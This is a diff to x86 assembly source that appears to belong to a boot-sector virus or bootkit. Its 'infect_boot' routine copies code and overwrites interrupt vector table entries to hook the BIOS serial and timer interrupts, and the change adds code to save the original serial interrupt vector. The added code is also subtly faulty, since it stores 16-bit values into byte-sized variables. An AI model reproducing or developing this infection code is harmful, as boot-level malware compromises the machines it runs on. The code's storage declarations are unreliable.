@@ -36,6 +36,13 @@ infect_boot:
     rep movsb
 
     ; Activating Serial Hook
+    xor ax, ax
+    mov es, ax
+    mov ax, [es:0x0070]                 ; BIOS Interrupt offset
+    mov [bios_serial_int_offset], ax
+    mov ax, [es:0x0072]                 ; BIOS Interrupt segment
+    mov [bios_serial_int_segment], ax
+    
     mov dx, (serial_hook - hooks_start)
     mov al, 0x0c
     call overwrite_ivt
@@ -129,6 +136,7 @@ overwrite_ivt:
 
 hooks_start:
 
+; TODO: Interrupt chaining
 serial_hook:
     push ax
     push dx
@@ -159,3 +167,6 @@ timer_hook:
 hooks_end:
 
 %include "ivt_backup.asm"
+
+bios_serial_int_offset  db 0
+bios_serial_int_segment db 0
